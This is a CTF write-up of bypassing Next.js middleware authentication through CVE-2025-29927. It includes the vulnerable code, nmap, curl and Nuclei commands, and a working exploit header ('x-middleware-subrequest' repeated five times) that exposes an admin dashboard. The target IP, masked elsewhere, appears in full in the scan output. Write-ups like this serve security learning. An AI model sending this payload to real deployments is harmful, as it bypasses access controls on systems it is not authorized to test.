# CTF Writeup: Next.js Middleware Auth Bypass (CVE-2025-29927)
**Difficulty:** Hard | **Platform:** Local Server | **Date:** January 2025

# 1. Executive Summary
This is how a "simple" web challenge turned into a 2-hour battle against my own assumptions. I was tasked with breaking into a modern Next.js 15.2.2 application. While I initially struggled with network instability and my own lack of experience with modern JS routing, I eventually successfully exploited CVE-2025-29927. By manipulating the x-middleware-subrequest header, I tricked the "bouncer" into letting me straight into the admin dashboard without a password.

# 2. Reconnaissance & Enumeration: The Fog of War
## 2.1. Fighting the Environment
The engagement started on a frustrating note. My internet was being incredibly inconsistent, and the challenge server seemed to be hanging. Every time I ran a scan, I faced consistent timeouts and server failures. I initially thought the server was underpowered, but it turned out my own latency was dropping critical packets.

The Lesson: I had to pivot. Instead of aggressive multi-threaded scanning, I slowed down my nmap timing and increased the retry count just to get a stable read on the services.

Bash
$ nmap -sV -p 3000 --max-retries 5 --host-timeout 30m 209.xx.xxx.x

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js (Next.js)

## 2.2. Identifying the Stack
Once the connection stabilized, a standard nmap scan revealed Port 3000 was open. A quick curl -I confirmed my target:

Shell
$ curl -I http://209.xx.xxx.x:3000/dashboard

HTTP/1.1 307 Temporary Redirect
Location: /login
X-Powered-By: Next.js

## 2.3. The Rabbit Hole (Where I Failed)
Because I lacked deep experience with Next.js internals at the time, I fell into a classic "tunnel vision" trap. I spent hours fuzzing the /login page for SQL injection and attempting to forge JWT tokens. I was attacking the application logic when the flaw was actually in the framework's routing architecture.

# 3. Vulnerability Analysis: The Internal Header Flaw
## 3.1. The Turning Point
After my "standard" web attacks failed, I stepped back to research framework-specific vulnerabilities. I came across CVE-2025-29927, an authorization bypass discovered by Rachid Allam (zhero).

The vulnerability revolves around an internal header: x-middleware-subrequest. Next.js uses this to prevent infinite loops. If this header is present with a specific value, the framework assumes the middleware has already executed and skips it entirely.

## 3.2. Code-Level Logic
I analyzed the vulnerable code snippet from the research:

JavaScript
const subreq = params.request.headers["x-middleware-subrequest"];
const subrequests = typeof subreq === "string" ? subreq.split(":") : [];

// If the bouncer thinks I've already been checked, it lets me in.
if (subrequests.includes(middlewareInfo.name)) {
  result = {
    response: NextResponse.next(),
    waitUntil: Promise.resolve(),
  }
  continue;
}
# 4. Exploitation & Initial Access
## 4.1. The Setup
To make sure I wasn't chasing a ghost, I spun up a local reproduction environment using Docker:

Bash
$ docker compose up -d
[+] Running 2/2
 ⠿ Network nextjs-bypass_default  Created
 ⠿ Container nextjs-app           Started
4.2. Initial Failure
My first attempt failed. I tried a simple header: x-middleware-subrequest: middleware. Result: Still redirected. I realized that in version 15.x, Next.js implements a recursion depth check. A single string wasn't enough.

## 4.3. The "Skeleton Key" Payload
I refined my payload to use a repeated string. This bypasses the recursion depth logic by making the request look like it has already "looped" through the security check 5 times.

Shell
$ curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://209.xx.xxx.x:3000/dashboard

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<body>
    <h1>Admin Dashboard</h1>
    <p>Welcome back, admin.</p>
    <p>Flag: CTF{M1d*******_P******}</p>
</body>
</html>

# 5. Automation: Scaling the Attack
To ensure I could catch this again, I used a Nuclei template to automate the detection across the subnet.

Bash
$ nuclei -u http://209.xx.xxx.x:3000 -t cve-2025-29927.yaml -vv

[CVE-2025-29927] [http] [critical] http://209.97.161.3:3000/dashboard [200 OK]

# 6. Conclusion & Remediation
This challenge was a massive wake-up call. I failed initially because I treated a modern React framework like a legacy PHP app.

Red Team Tip: Always check /_next/static to map out the internal project structure. Don't trust the bouncer; sometimes you can just tell them you've already been inside.
